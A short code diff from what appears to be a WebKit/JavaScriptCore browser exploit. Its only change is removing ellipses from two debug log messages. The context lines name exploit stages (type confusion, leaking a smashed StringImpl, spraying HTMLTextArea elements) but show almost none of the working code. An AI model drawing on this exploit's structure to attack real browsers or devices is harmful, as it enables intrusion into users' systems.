@@ -192,7 +192,7 @@ function confuseTargetObjRound2() {
 
 /* Executed after deleteBubbleTree */
 function leakJSC() {
-	debug_log("[+] Looking for the smashed StringImpl...");
+	debug_log("[+] Looking for the smashed StringImpl");
 
 	var arr_str = Object.getOwnPropertyNames(g_obj_str);
 
@@ -417,7 +417,7 @@ function sprayHTMLTextArea() {
 	debug_log("");
 	debug_log("");
 	debug_log("");
-	debug_log("[+] Spraying HTMLTextareaElement ...");
+	debug_log("[+] Spraying HTMLTextareaElement");
 
 	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
